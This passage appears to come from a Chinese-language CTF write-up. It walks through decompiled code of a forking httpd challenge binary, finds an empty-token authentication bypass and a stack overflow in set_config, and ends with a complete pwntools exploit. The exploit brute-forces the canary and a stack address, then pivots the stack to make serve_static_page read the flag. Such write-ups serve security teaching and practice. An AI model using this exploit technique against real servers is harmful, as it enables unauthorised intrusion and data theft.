  *(_WORD *)addr.sa_data = htons(0x270Fu);
  if ( bind(fd, &addr, 0x10u) < 0 )
  {
    perror("Bind failed");
    exit(1);
  }
  if ( listen(fd, 256) < 0 )
  {
    perror("Listen failed");
    exit(1);
  }
  act.sa_handler = (__sighandler_t)errormessage;
  sigemptyset(&act.sa_mask);
  act.sa_flags = 0;
  sigaction(11, &act, 0);
  sigaction(6, &act, 0);
  signal(17, (__sighandler_t)1);
  printf(format, 9999);
  init_admin_state();
  while ( 1 )
  {
    while ( 1 )
    {
      addr_len = 16;
      v6 = accept(fd, &v9, &addr_len);
      if ( v6 >= 0 )
        break;
      if ( *__errno_location() != 4 )
        perror("accept failed");
    }
    v7 = fork();
    if ( v7 >= 0 )
    {
      if ( !v7 )
      {
        close(fd);
        g_client_fd = v6;
        type_route(v6);
        close(v6);
        exit(0);
      }
      close(v6);
    }
    else
    {
      perror("fork failed");
      close(v6);
    }
  }
}
```

用 fork ，可以多次利用

#### type_route

```c
// Top-level request dispatcher: allocate request_t, parse one request, then branch to GET or POST handlers based on req->method.
void __fastcall type_route(int fd)
{
  request_t *s; // [rsp+18h] [rbp-8h]

  s = (request_t *)malloc(0x2A78u);
  memset(s, 0, sizeof(request_t));
  parse_rq(fd, s);
  if ( !strcmp(s->method, "GET") )
    handle_get(fd, s);
  if ( !strcmp(s->method, "POST") )
    handle_post(fd, s);
  free(s);
}
```

先 parse_rq 解析请求再处理

#### struct

```c
00000000 #pragma pack(push, 2)
00000000 struct http_header_t // sizeof=0x140
00000000 {
00000000     char name[64];
00000040     char value[256];
00000140 };
00000140 #pragma pack(pop)

00000000 #pragma pack(push, 2)
00000000 struct request_t // sizeof=0x2A78
00000000 {
00000000     char method[16];
00000010     char path[256];
00000110     char version[16];
00000120     int header_count;
00000124     http_header_t headers[32];
00002924     char cookie_key[64];
00002964     char cookie_value[256];
00002A64     int _pad;
00002A68     char *post_body;
00002A70     size_t content_length;
00002A78 };
00002A78 #pragma pack(pop)

00000000 #pragma pack(push, 2)
00000000 struct post_field_t // sizeof=0x2010
00000000 {
00000000     char key[4096];
00001000     size_t key_len;
00001008     char value[4096];
00002008     size_t value_len;
00002010 };
00002010 #pragma pack(pop)

00000000 #pragma pack(push, 2)
00000000 struct admin_info_t // sizeof=0x100
00000000 {
00000000     char username[32];
00000020     char password[32];
00000040     char token[64];
00000080     char route_name[32];
000000A0     char ip[32];
000000C0     char subnet_mask[32];
000000E0     char gateway[32];
00000100 };
00000100 #pragma pack(pop)
```

#### parse_rq

```c
// Parse one HTTP request from the client socket into request_t. For POST, it copies the body once based on Content-Length.
unsigned __int64 __fastcall parse_rq(int fd, request_t *req)
{
  size_t v2; // rax
  char *haystack; // [rsp+10h] [rbp-1070h]
  char *nptr; // [rsp+18h] [rbp-1068h]
  char *end; // [rsp+28h] [rbp-1058h]
  char *begin; // [rsp+30h] [rbp-1050h]
  char *linend; // [rsp+30h] [rbp-1050h]
  char *tip; // [rsp+40h] [rbp-1040h]
  const char *s; // [rsp+50h] [rbp-1030h]
  char *eq; // [rsp+58h] [rbp-1028h]
  char *tkend; // [rsp+68h] [rbp-1018h]
  _QWORD buf[513]; // [rsp+70h] [rbp-1010h] BYREF
  unsigned __int64 v14; // [rsp+1078h] [rbp-8h]

  v14 = __readfsqword(0x28u);
  memset(buf, 0, 0x1000u);
  read(fd, buf, 0xFFFu);
  end = strstr((const char *)buf, "\r\n\r\n");
  begin = strstr((const char *)buf, "\r\n");
  *begin = 0;
  __isoc99_sscanf(buf, "%15s %255s %15s", req, req->path, req->version);// Head
  for ( haystack = begin + 2; haystack < end; haystack = linend + 2 )
  {
    linend = strstr(haystack, "\r\n");
    *linend = 0;
    tip = strchr(haystack, ':');
    if ( tip )
    {
      *tip = 0;
      for ( nptr = tip + 1; *nptr == ' '; ++nptr )
        ;
      if ( req->header_count <= 31 )
      {
        strncpy(req->headers[req->header_count].name, haystack, 0x3Fu);
        strncpy(req->headers[req->header_count].value, nptr, 0xFFu);
        ++req->header_count;
      }
      if ( !strcmp(haystack, "Content-Length") )
        req->content_length = atoi(nptr);
      if ( !strcmp(haystack, "Cookie") )
      {
        s = strstr(nptr, "token");
        if ( s )
        {
          eq = strchr(s, '=');
          *eq = 0;
          tkend = strchr(eq + 1, ';');
          if ( tkend )
            *tkend = 0;
          strncpy(req->cookie_key, s, 0x3Fu);
          strncpy(req->cookie_value, eq + 1, 0xFFu);
        }
      }
    }
  }
  if ( !strcmp(req->method, "POST") )
  {
    req->post_body = (char *)malloc(req->content_length + 3);
    v2 = malloc_usable_size(req->post_body);
    memset(req->post_body, 0, v2);
    memcpy(req->post_body, end + 4, req->content_length);
    memcpy(&req->post_body[req->content_length], "\r\n", 2u);
  }
  return v14 - __readfsqword(0x28u);
}
```

正常的解析请求

请求头会解析 Cookie 的 token 字段

#### handle_get

```c
// GET route handler. Uses an 8-byte stack buffer for the normalized path, serves a few fixed pages, and exposes an unauthenticated /getCookie route.
unsigned __int64 __fastcall handle_get(unsigned int fd, request_t *req)
{
  int v2; // eax
  int v3; // eax
  int v4; // eax
  int v5; // eax
  char s1[8]; // [rsp+10h] [rbp-210h] BYREF
  __int64 v8; // [rsp+18h] [rbp-208h]
  __int64 v9; // [rsp+20h] [rbp-200h]
  __int64 v10; // [rsp+28h] [rbp-1F8h]
  __int64 v11; // [rsp+30h] [rbp-1F0h]
  __int64 v12; // [rsp+38h] [rbp-1E8h]
  __int64 v13; // [rsp+40h] [rbp-1E0h]
  __int64 v14; // [rsp+48h] [rbp-1D8h]
  __int64 v15; // [rsp+50h] [rbp-1D0h]
  __int64 v16; // [rsp+58h] [rbp-1C8h]
  __int64 v17; // [rsp+60h] [rbp-1C0h]
  __int64 v18; // [rsp+68h] [rbp-1B8h]
  __int64 v19; // [rsp+70h] [rbp-1B0h]
  __int64 v20; // [rsp+78h] [rbp-1A8h]
  __int64 v21; // [rsp+80h] [rbp-1A0h]
  __int64 v22; // [rsp+88h] [rbp-198h]
  __int64 v23; // [rsp+90h] [rbp-190h]
  __int64 v24; // [rsp+98h] [rbp-188h]
  __int64 v25; // [rsp+A0h] [rbp-180h]
  __int64 v26; // [rsp+A8h] [rbp-178h]
  __int64 v27; // [rsp+B0h] [rbp-170h]
  __int64 v28; // [rsp+B8h] [rbp-168h]
  __int64 v29; // [rsp+C0h] [rbp-160h]
  __int64 v30; // [rsp+C8h] [rbp-158h]
  __int64 v31; // [rsp+D0h] [rbp-150h]
  __int64 v32; // [rsp+D8h] [rbp-148h]
  __int64 v33; // [rsp+E0h] [rbp-140h]
  __int64 v34; // [rsp+E8h] [rbp-138h]
  __int64 v35; // [rsp+F0h] [rbp-130h]
  __int64 v36; // [rsp+F8h] [rbp-128h]
  __int64 v37; // [rsp+100h] [rbp-120h]
  __int64 v38; // [rsp+108h] [rbp-118h]
  char s[8]; // [rsp+110h] [rbp-110h] BYREF
  __int64 v40; // [rsp+118h] [rbp-108h]
  __int64 v41; // [rsp+120h] [rbp-100h]
  __int64 v42; // [rsp+128h] [rbp-F8h]
  __int64 v43; // [rsp+130h] [rbp-F0h]
  __int64 v44; // [rsp+138h] [rbp-E8h]
  __int64 v45; // [rsp+140h] [rbp-E0h]
  __int64 v46; // [rsp+148h] [rbp-D8h]
  __int64 v47; // [rsp+150h] [rbp-D0h]
  __int64 v48; // [rsp+158h] [rbp-C8h]
  __int64 v49; // [rsp+160h] [rbp-C0h]
  __int64 v50; // [rsp+168h] [rbp-B8h]
  __int64 v51; // [rsp+170h] [rbp-B0h]
  __int64 v52; // [rsp+178h] [rbp-A8h]
  __int64 v53; // [rsp+180h] [rbp-A0h]
  __int64 v54; // [rsp+188h] [rbp-98h]
  __int64 v55; // [rsp+190h] [rbp-90h]
  __int64 v56; // [rsp+198h] [rbp-88h]
  __int64 v57; // [rsp+1A0h] [rbp-80h]
  __int64 v58; // [rsp+1A8h] [rbp-78h]
  __int64 v59; // [rsp+1B0h] [rbp-70h]
  __int64 v60; // [rsp+1B8h] [rbp-68h]
  __int64 v61; // [rsp+1C0h] [rbp-60h]
  __int64 v62; // [rsp+1C8h] [rbp-58h]
  __int64 v63; // [rsp+1D0h] [rbp-50h]
  __int64 v64; // [rsp+1D8h] [rbp-48h]
  __int64 v65; // [rsp+1E0h] [rbp-40h]
  __int64 v66; // [rsp+1E8h] [rbp-38h]
  __int64 v67; // [rsp+1F0h] [rbp-30h]
  __int64 v68; // [rsp+1F8h] [rbp-28h]
  __int64 v69; // [rsp+200h] [rbp-20h]
  __int64 v70; // [rsp+208h] [rbp-18h]
  unsigned __int64 v71; // [rsp+218h] [rbp-8h]

  v71 = __readfsqword(0x28u);
  *(_QWORD *)s1 = 0;
  v8 = 0;
  v9 = 0;
  v10 = 0;
  v11 = 0;
  v12 = 0;
  v13 = 0;
  v14 = 0;
  v15 = 0;
  v16 = 0;
  v17 = 0;
  v18 = 0;
  v19 = 0;
  v20 = 0;
  v21 = 0;
  v22 = 0;
  v23 = 0;
  v24 = 0;
  v25 = 0;
  v26 = 0;
  v27 = 0;
  v28 = 0;
  v29 = 0;
  v30 = 0;
  v31 = 0;
  v32 = 0;
  v33 = 0;
  v34 = 0;
  v35 = 0;
  v36 = 0;
  v37 = 0;
  v38 = 0;
  extract_path_no_query(req->path, s1);
  if ( !strcmp(s1, "/index") || !strcmp(s1, "/") )
  {
    LOBYTE(v2) = judge_token(req);
    if ( v2 )
    {
      serve_static_page(fd, "index.html", 200u);
      return v71 - __readfsqword(0x28u);
    }
LABEL_19:
    send_redirect(fd, "/login", 0);
    return v71 - __readfsqword(0x28u);
  }
  if ( !strcmp(s1, "/login") )
  {
    LOBYTE(v3) = judge_token(req);
    if ( v3 )
      send_redirect(fd, "/index", 0);
    else
      serve_static_page(fd, "login.html", 0xC8u);
  }
  else
  {
    if ( !strcmp(s1, "/logout") )
    {
      *(_QWORD *)s = 0;
      v40 = 0;
      v41 = 0;
      v42 = 0;
      v43 = 0;
      v44 = 0;
      v45 = 0;
      v46 = 0;
      v47 = 0;
      v48 = 0;
      v49 = 0;
      v50 = 0;
      v51 = 0;
      v52 = 0;
      v53 = 0;
      v54 = 0;
      v55 = 0;
      v56 = 0;
      v57 = 0;
      v58 = 0;
      v59 = 0;
      v60 = 0;
      v61 = 0;
      v62 = 0;
      v63 = 0;
      v64 = 0;
      v65 = 0;
      v66 = 0;
      v67 = 0;
      v68 = 0;
      v69 = 0;
      v70 = 0;
      snprintf(s, 0x100u, "token=%s; Max-Age=0;", g_admin->token);
      memset(g_admin->token, 0, sizeof(g_admin->token));
      send_redirect(fd, "/login", s);
      return v71 - __readfsqword(0x28u);
    }
    if ( !strcmp(s1, "/resetPasswd") )
    {
      LOBYTE(v4) = judge_token(req);
      if ( v4 )
      {
        serve_static_page(fd, "reset_passwd.html", 0xC8u);
        return v71 - __readfsqword(0x28u);
      }
      goto LABEL_19;
    }
    if ( !strcmp(s1, "/config") )
    {
      LOBYTE(v5) = judge_token(req);
      if ( v5 )
      {
        serve_static_page(fd, "config.html", 0xC8u);
        return v71 - __readfsqword(0x28u);
      }
      goto LABEL_19;
    }
    if ( !strcmp(s1, "/getCookie") )
    {
      generate_session_token((__int64)g_admin->token);
      snprintf(s, 0x100u, "token=%s;", g_admin->token);
      send_redirect(fd, "/login", s);
    }
    else
    {
      serve_static_page(fd, "404.html", 0x194u);
    }
  }
  return v71 - __readfsqword(0x28u);
}
```

全是静态页面，，，没啥用

但是 serve_static_page 这个函数有点意思，如果能劫持他的参数，就可以让它回弹目录下的 flag 文件

#### handle_post

```c
// POST route handler. Supports /login, /resetPasswd, and /config; all non-login actions require a valid token.
unsigned __int64 __fastcall handle_post(unsigned int fd, request_t *req)
{
  int v2; // eax
  int v3; // eax
  char s1[8]; // [rsp+50h] [rbp-110h] BYREF
  __int64 v6; // [rsp+58h] [rbp-108h]
  __int64 v7; // [rsp+60h] [rbp-100h]
  __int64 v8; // [rsp+68h] [rbp-F8h]
  __int64 v9; // [rsp+70h] [rbp-F0h]
  __int64 v10; // [rsp+78h] [rbp-E8h]
  __int64 v11; // [rsp+80h] [rbp-E0h]
  __int64 v12; // [rsp+88h] [rbp-D8h]
  __int64 v13; // [rsp+90h] [rbp-D0h]
  __int64 v14; // [rsp+98h] [rbp-C8h]
  __int64 v15; // [rsp+A0h] [rbp-C0h]
  __int64 v16; // [rsp+A8h] [rbp-B8h]
  __int64 v17; // [rsp+B0h] [rbp-B0h]
  __int64 v18; // [rsp+B8h] [rbp-A8h]
  __int64 v19; // [rsp+C0h] [rbp-A0h]
  __int64 v20; // [rsp+C8h] [rbp-98h]
  __int64 v21; // [rsp+D0h] [rbp-90h]
  __int64 v22; // [rsp+D8h] [rbp-88h]
  __int64 v23; // [rsp+E0h] [rbp-80h]
  __int64 v24; // [rsp+E8h] [rbp-78h]
  __int64 v25; // [rsp+F0h] [rbp-70h]
  __int64 v26; // [rsp+F8h] [rbp-68h]
  __int64 v27; // [rsp+100h] [rbp-60h]
  __int64 v28; // [rsp+108h] [rbp-58h]
  __int64 v29; // [rsp+110h] [rbp-50h]
  __int64 v30; // [rsp+118h] [rbp-48h]
  __int64 v31; // [rsp+120h] [rbp-40h]
  __int64 v32; // [rsp+128h] [rbp-38h]
  __int64 v33; // [rsp+130h] [rbp-30h]
  __int64 v34; // [rsp+138h] [rbp-28h]
  __int64 v35; // [rsp+140h] [rbp-20h]
  __int64 v36; // [rsp+148h] [rbp-18h]
  unsigned __int64 v37; // [rsp+158h] [rbp-8h]

  v37 = __readfsqword(0x28u);
  *(_QWORD *)s1 = 0;
  v6 = 0;
  v7 = 0;
  v8 = 0;
  v9 = 0;
  v10 = 0;
  v11 = 0;
  v12 = 0;
  v13 = 0;
  v14 = 0;
  v15 = 0;
  v16 = 0;
  v17 = 0;
  v18 = 0;
  v19 = 0;
  v20 = 0;
  v21 = 0;
  v22 = 0;
  v23 = 0;
  v24 = 0;
  v25 = 0;
  v26 = 0;
  v27 = 0;
  v28 = 0;
  v29 = 0;
  v30 = 0;
  v31 = 0;
  v32 = 0;
  v33 = 0;
  v34 = 0;
  v35 = 0;
  v36 = 0;
  extract_path_no_query(req->path, s1);
  if ( !strncmp(s1, "/login", 6u) )
  {
    if ( (unsigned int)judgeuser(req, g_admin) )
    {
      send_http_response(fd, 200, "application/json", "{\"authLogin\" : 1}");
      return v37 - __readfsqword(0x28u);
    }
LABEL_16:
    send_http_response(fd, 200, "application/json", "{\"authLogin\" : 0}");
    return v37 - __readfsqword(0x28u);
  }
  if ( !strcmp(s1, "/resetPasswd") )
  {
    LOBYTE(v2) = judge_token(req);
    if ( !v2 )
      goto LABEL_16;
    if ( (unsigned int)reset_password(req, g_admin) )
      send_http_response(fd, 200, "application/json", "{\"reset\" : 1}");
    else
      send_http_response(fd, 200, "application/json", "{\"reset\" : 0}");
  }
  else
  {
    if ( strcmp(s1, "/config") )
    {
      serve_static_page(fd, "404.html", 0x194u);
      return v37 - __readfsqword(0x28u);
    }
    LOBYTE(v3) = judge_token(req);
    if ( !v3 )
      goto LABEL_16;
    if ( (unsigned int)set_config(req, g_admin) )
      send_http_response(fd, 200, "application/json", "{\"setInfo\" : 1}");
    else
      send_http_response(fd, 200, "application/json", "{\"setInfo\" : 0}");
  }
  return v37 - __readfsqword(0x28u);
}
```

想要访问页面并使用下层函数需要通过 judge_token ，然后惊讶地发现最开始 init 的时候 token 是空的，在 Cookie 中将 token 设定为空即可绕过鉴权

#### set_config

```c
__int64 __fastcall set_config(request_t *req, admin_info_t *admin)
{
  __int64 v3; // rbx
  __int64 v4; // rbx
  __int64 v5; // rbx
  __int64 v6; // rbx
  __int64 v7; // rbx
  __int64 v8; // rbx
  __int64 v9; // rbx
  __int64 v10; // rbx
  post_field_t *out_field; // [rsp+10h] [rbp-B0h] BYREF
  post_field_t *fields; // [rsp+18h] [rbp-A8h]
  _QWORD dest[4]; // [rsp+20h] [rbp-A0h] BYREF
  _QWORD v14[4]; // [rsp+40h] [rbp-80h] BYREF
  _QWORD v15[4]; // [rsp+60h] [rbp-60h] BYREF
  _QWORD v16[7]; // [rsp+80h] [rbp-40h] BYREF

  v16[5] = __readfsqword(0x28u);
  fields = make_post_ptr(req);
  if ( !(unsigned int)searchtok("route_name", fields, &out_field) )
    return 0;
  memcpy(dest, out_field->value, out_field->value_len);
  if ( !(unsigned int)searchtok("ip", fields, &out_field) )
    return 0;
  memcpy(v14, out_field->value, out_field->value_len);
  if ( !(unsigned int)searchtok("subnet_mask", fields, &out_field) )
    return 0;
  memcpy(v15, out_field->value, out_field->value_len);
  if ( !(unsigned int)searchtok("gateway", fields, &out_field) )
    return 0;
  memcpy(v16, out_field->value, out_field->value_len);
  v3 = dest[1];
  *(_QWORD *)admin->route_name = dest[0];
  *(_QWORD *)&admin->route_name[8] = v3;
  v4 = dest[3];
  *(_QWORD *)&admin->route_name[16] = dest[2];
  *(_QWORD *)&admin->route_name[24] = v4;
  v5 = v14[1];
  *(_QWORD *)admin->ip = v14[0];
  *(_QWORD *)&admin->ip[8] = v5;
  v6 = v14[3];
  *(_QWORD *)&admin->ip[16] = v14[2];
  *(_QWORD *)&admin->ip[24] = v6;
  v7 = v15[1];
  *(_QWORD *)admin->subnet_mask = v15[0];
  *(_QWORD *)&admin->subnet_mask[8] = v7;
  v8 = v15[3];
  *(_QWORD *)&admin->subnet_mask[16] = v15[2];
  *(_QWORD *)&admin->subnet_mask[24] = v8;
  v9 = v16[1];
  *(_QWORD *)admin->gateway = v16[0];
  *(_QWORD *)&admin->gateway[8] = v9;
  v10 = v16[3];
  *(_QWORD *)&admin->gateway[16] = v16[2];
  *(_QWORD *)&admin->gateway[24] = v10;
  return 1;
}
```

这个 httpd 的风险函数挺多的，由于 value_len 可以自行指定，因此存在栈溢出漏洞

#### parse_post_fields

```c
// Split application/x-www-form-urlencoded body into up to 20 post_field_t entries, URL-decoding both key and value.
unsigned __int64 __fastcall parse_post_fields(char *body, post_field_t *fields)
{
  unsigned __int64 result; // rax
  int i; // [rsp+18h] [rbp-48h]
  char *line_cur; // [rsp+20h] [rbp-40h]
  char *s1; // [rsp+28h] [rbp-38h]
  char *j; // [rsp+30h] [rbp-30h]
  _BYTE *s; // [rsp+48h] [rbp-18h]

  result = (unsigned __int64)body;
  line_cur = body;
  for ( i = 0; i <= 19; ++i )
  {
    result = (unsigned __int8)*line_cur;
    if ( (_BYTE)result == '\n' )
      break;
    for ( s1 = line_cur; *s1 != '&' && strncmp(s1, "\r\n", 2u); ++s1 )
      ;
    for ( j = line_cur; *j != '=' && strncmp(j, "\r\n", 2u); ++j )
      ;
    if ( *j == '=' )
    {
      s = malloc(0x1000u);
      memset(s, 0, 0x1000u);
      memcpy(s, line_cur, (int)j - (int)line_cur);
      fields[i].key_len = (size_t)url_decode_component(fields[i].key, s);
      memcpy(s, j + 1, (int)s1 - ((int)j + 1));
      fields[i].value_len = (size_t)url_decode_component(fields[i].value, s);
      free(s);
    }
    result = (unsigned __int64)(s1 + 1);
    line_cur = s1 + 1;
  }
  return result;
}
```

POST body 的格式是 key1=keyvalue1&key2=keyvalue2...

#### url_decode_component

```c
_BYTE *__fastcall url_decode_component(_BYTE *a1, _BYTE *a2)
{
  _BYTE *v2; // rax
  _BYTE *v3; // rax
  _BYTE *v4; // rdx
  _BYTE *v5; // rax
  _BYTE *v6; // rdx
  _BYTE *v7; // rax
  int v9; // [rsp+18h] [rbp-18h]
  int v10; // [rsp+1Ch] [rbp-14h]
  _BYTE *v11; // [rsp+20h] [rbp-10h]

  v11 = a1;
  while ( *a2 )
  {
    if ( *a2 == '+' )
    {
      v2 = v11++;
      *v2 = ' ';
      ++a2;
    }
    else if ( *a2 == '%' )
    {
      if ( !a2[1] || !a2[2] || (v9 = hex_to_nibble(a2[1]), v10 = hex_to_nibble(a2[2]), v9 == -1) || v10 == -1 )
      {
        v4 = a2++;
        v5 = v11++;
        *v5 = *v4;
      }
      else
      {
        v3 = v11++;
        *v3 = v10 | (16 * v9);
        a2 += 3;
      }
    }
    else
    {
      v6 = a2++;
      v7 = v11++;
      *v7 = *v6;
    }
  }
  *v11 = 0;
  return (_BYTE *)(v11 - a1);
}
```

解析 url

### 攻击思路

唯一的漏洞是 setconfig 函数的栈溢出

利用这个栈溢出我们可以实现 canary 的爆破和 stack 的爆破

我们希望最终能劫持 serve_static_page 来完成读取 flag 的任务

要怎么做呢？请看汇编：

```
.text:0000000000402BDB                 endbr64
.text:0000000000402BDF                 push    rbp
.text:0000000000402BE0                 mov     rbp, rsp
.text:0000000000402BE3                 sub     rsp, 30h
.text:0000000000402BE7                 mov     [rbp+var_24], edi
.text:0000000000402BEA                 mov     [rbp+filename], rsi
.text:0000000000402BEE                 mov     [rbp+var_28], edx
.text:0000000000402BF1                 mov     rax, [rbp+filename]
.text:0000000000402BF5                 lea     rdx, modes      ; "r"
.text:0000000000402BFC                 mov     rsi, rdx        ; modes
.text:0000000000402BFF                 mov     rdi, rax        ; filename
.text:0000000000402C02                 call    _fopen
```

我们可以通过栈迁移到栈上去布置 `[rbp+var_24] | [rbp+filename] | [rbp+var_28]` 然后 rip 跳到 402BF5 ，这样就相当于劫持了 serve_static_page 的参数

然后就可以读取 flag 啦

### exp

```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'
context.terminal = ['tmux', 'splitw', '-h']

debug = 1

file = './httpd'
elf = ELF(file)

target = '60.205.163.215'
port = 13774

def conn():
    if debug:
        return remote('127.0.0.1', 9999)
    else:
        return remote(target, port)

io = p = None

def dbg(cmd = ''):
    if debug:
        gdb.attach(p, gdbscript = cmd)

s       = lambda data           :p.send(data)
sl      = lambda data           :p.sendline(data)
sa      = lambda x, data        :p.sendafter(x, data)
sla     = lambda x, data        :p.sendlineafter(x, data)
r       = lambda num=4096       :p.recv(num)
rl      = lambda num=4096       :p.recvline(num)
ru      = lambda x              :p.recvuntil(x)
itr     = lambda                :p.interactive()
uu32    = lambda data           :u32(data.ljust(4, b'\x00'))
uu64    = lambda data           :u64(data.ljust(8, b'\x00'))
uru64   = lambda                :uu64(ru('\x7f')[-6:])
leak    = lambda name           :log.success(name + ' = ' + hex(eval(name)))

canary = b'\x00'
stack = b''

def url_encode(data):
    if isinstance(data, str):
        data = data.encode()
    return ''.join(f'%{b:02x}' for b in data).encode()

def build_req(method, path, headers=None, body=b''):
    request = f'{method} {path} HTTP/1.1\r\n'.encode()
    if headers is None:
        headers = {}
    if body and 'Content-Length' not in headers:
        headers['Content-Length'] = len(body)
    for k, v in headers.items():
        request += f'{k}: {v}\r\n'.encode()
    request += b'\r\n'
    request += body
    return request

def config(name, ip, subnet_mask, gateway):
    global p
    p = conn()
    s(build_req('POST', '/config', {
        'Cookie': 'token='
    }, b'route_name=' + name + b'&ip=' + ip + b'&subnet_mask=' + subnet_mask + b'&gateway=' + gateway))

def explode_canary():
    global p, canary
    for _ in range(7):
        for i in range(0x100):
            payload = b'A' * 0x28 + url_encode(canary + p8(i))
            config(b'', b'', b'', payload)
            if b'500 Internal Server Error' not in ru(b'\r\n\r\n'):
                canary += p8(i)
                log.success(f'Found canary byte: {i:#x}')
                p.close()
                break
            p.close()

def explode_stack():
    global p, stack
    for _ in range(6):
        for i in range(0x100):
            payload = b'A' * 0x28 + url_encode(p64(canary)) + b'A' * 0x10 + url_encode(stack + p8(i))
            config(b'', b'', b'', payload)
            if b'500 Internal Server Error' not in ru(b'\r\n\r\n'):
                stack += p8(i)
                log.success(f'Found stack byte: {i:#x}')
                p.close()
                break
            p.close()

send_page_addr = 0x402BF1

explode_canary()
canary = u64(canary)
log.success(f'Leaked canary: {hex(canary)}')
explode_stack()
stack = uu64(stack) - 0x170
log.success(f'Leaked stack address: {hex(stack)}')
pause()

payload = b'A' * 0x28 + url_encode(p64(canary)) + b'A' * 0x10 + url_encode(p64(stack + 0x40)) + url_encode(p64(send_page_addr))
fake_stack = flat({
    0x00: stack + 0x20,
    0x08: p32(200),
    0x0C: p32(4),
    0x10: b'flag\x00',
}, filler=b'\x00')
payload += url_encode(fake_stack)
config(b'', b'', b'', payload)
itr()
```